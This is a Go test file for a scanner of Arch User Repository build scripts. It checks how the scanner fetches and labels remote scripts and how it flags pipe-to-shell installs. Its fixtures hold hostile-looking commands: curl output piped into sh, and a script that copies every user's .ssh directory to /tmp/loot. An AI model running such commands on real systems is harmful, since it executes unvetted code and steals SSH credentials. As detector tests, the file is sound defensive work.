package pipeline

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/manticore-projects/aurscan/internal/rules"
	"github.com/manticore-projects/aurscan/internal/scan"
)

// Retrieval is evidence-gathering, and the asymmetry is the whole point: it may
// raise a verdict, never lower one. A benign script does not clear pipe_to_shell,
// because the finding is about the absence of pinning, not about the bytes.
func TestFetchedScriptCannotClearTheFinding(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Verbatim from 1panel-stable-bin: harmless install telemetry.
		w.Write([]byte("#!/bin/sh\ndo_logging() { curl -k \"$1\" >/dev/null 2>&1 & }\n"))
	}))
	defer srv.Close()

	t.Setenv("AURSCAN_RULES_ONLY", "1")
	t.Setenv("AURSCAN_FETCH_REMOTE", "1")
	t.Setenv("AURSCAN_CONFIG_DIR", t.TempDir())
	t.Setenv("AURSCAN_CACHE_DIR", t.TempDir())

	files := scan.Files{"PKGBUILD": "pkgname=x\nbuild(){ curl -sfL " + srv.URL + "/i.sh | sh; }"}
	r := Run("x", files, "")

	if r.V.Verdict == "OK" {
		t.Errorf("a harmless script must not clear the unpinned fetch: %q", r.V.Summary)
	}
	var sawDLE bool
	for _, f := range r.V.Findings {
		if strings.Contains(f.Why, "DLE-00") {
			sawDLE = true
		}
	}
	if !sawDLE {
		t.Error("the pipe-to-shell finding must survive retrieval")
	}
}

// The retrieved content is added, labelled, and scannable — so a hostile script
// escalates rather than passing unread.
func TestFetchedScriptIsAddedAndLabelled(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("#!/bin/sh\ncp -r /home/*/.ssh /tmp/loot\n"))
	}))
	defer srv.Close()

	files := scan.Files{"PKGBUILD": "pkgname=x\nbuild(){ curl -sfL " + srv.URL + "/i.sh | sh; }"}
	t.Setenv("AURSCAN_FETCH_REMOTE", "1")
	fetchRemoteScripts(files)

	var name, body string
	for n, c := range files {
		if strings.HasPrefix(n, remotePrefix) {
			name, body = n, c
		}
	}
	if name == "" {
		t.Fatal("no retrieved file was added")
	}
	if !strings.Contains(body, "WHAT THE URL SERVED AT SCAN TIME") {
		t.Error("retrieved content must be labelled as evidence about the present")
	}
	if !strings.Contains(body, "sha256 ") {
		t.Error("retrieved content must record a digest so a later fetch is comparable")
	}
	if !strings.Contains(body, "/home/*/.ssh") {
		t.Error("the script body must be present for the rules and the model to read")
	}
}

// Off by default. Contacting hosts a package names must never be silent.
func TestNoFetchWithoutOptIn(t *testing.T) {
	t.Setenv("AURSCAN_FETCH_REMOTE", "")
	if FetchRemote() {
		t.Fatal("FetchRemote must default to off")
	}
	files := scan.Files{"PKGBUILD": "pkgname=x\nbuild(){ curl -sfL https://127.0.0.1:1/i.sh | sh; }"}
	if urls := rules.RemoteExecURLs(files); len(urls) != 1 {
		t.Fatalf("expected the URL to be identified, got %v", urls)
	}
	// Identified, but not retrieved: Run must not touch the network.
	t.Setenv("AURSCAN_RULES_ONLY", "1")
	t.Setenv("AURSCAN_CONFIG_DIR", t.TempDir())
	t.Setenv("AURSCAN_CACHE_DIR", t.TempDir())
	Run("x", files, "")
	for n := range files {
		if strings.HasPrefix(n, remotePrefix) {
			t.Error("a fetch happened without opt-in")
		}
	}
}

// An unreachable URL is recorded as unreachable, not silently dropped: the
// package still pipes it into a shell.
func TestUnreachableURLIsRecorded(t *testing.T) {
	t.Setenv("AURSCAN_FETCH_REMOTE", "1")
	files := scan.Files{"PKGBUILD": "pkgname=x\nbuild(){ curl -sfL http://127.0.0.1:1/i.sh | sh; }"}
	fetchRemoteScripts(files)
	for n, c := range files {
		if strings.HasPrefix(n, remotePrefix) {
			if !strings.Contains(c, "could not retrieve") {
				t.Errorf("expected a failure note, got %q", c)
			}
			return
		}
	}
	t.Error("an unreachable URL must still be recorded")
}
